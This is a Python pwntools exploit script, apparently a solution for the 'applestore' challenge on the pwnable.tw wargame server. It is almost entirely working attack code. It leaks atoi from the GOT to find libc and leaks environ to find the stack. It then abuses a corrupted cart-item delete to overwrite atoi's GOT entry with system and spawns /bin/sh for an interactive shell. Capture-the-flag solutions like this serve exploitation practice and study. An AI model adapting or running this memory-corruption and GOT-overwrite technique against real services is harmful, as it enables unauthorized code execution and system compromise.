#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])

#p = process('./applestore')
p = remote('chall.pwnable.tw', 10104)

Debug = False

if Debug:
    gdb.attach(p, '''
        break delete
        ignore 1 1
        continue
        record
        finish
        rsi
        rsi
        p /x $ebp
    ''')

'''
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
'''

# add
for i in range(6):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', '1')
for i in range(20):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', '2')

elf = ELF('./applestore')

# checkout
p.sendlineafter('> ', '5')
p.sendlineafter('> ', 'y')

# cart
p.sendlineafter('> ', '4')
p.sendlineafter('> ', 'y\0' + p32(elf.got['atoi']) + p32(0) * 3)
p.recvuntil('27: ')
atoi_real = u32(p.recv(4))
log.success('atoi_real = ' + hex(atoi_real))

libc = ELF('./libc_32.so.6')
libc.address = atoi_real - libc.symbols['atoi']

symtem_real = libc.symbols['system']
environ_got = libc.symbols['environ']
log.success('symtem_real = ' + hex(symtem_real))
log.success('environ_got = ' + hex(environ_got))

# delete
p.sendlineafter('> ', '3')
p.sendlineafter('> ', '27')

# cart
p.sendlineafter('> ', '4')
p.sendlineafter('> ', 'y\0' + p32(environ_got) + p32(0) * 3)
p.recvuntil('27: ')
environ_real = u32(p.recv(4))
log.success('environ_real = ' + hex(environ_real))
ebp_in_delete = environ_real - 0x104
log.success('ebp_in_delete = ' + hex(ebp_in_delete))
ebp_in_handler = ebp_in_delete + 0x4
log.success('ebp_in_handler = ' + hex(ebp_in_handler))
target_ebp = ebp_in_handler - 0xc
target_atoi = elf.got['atoi'] + 0x22

# delete
p.sendlineafter('> ', '3')
p.sendlineafter('> ', '27' + p32(elf.got['atoi']) + p32(0) + p32(target_atoi) + p32(target_ebp))

p.sendlineafter('> ', p32(symtem_real) + ';/bin/sh\0')

p.interactive()
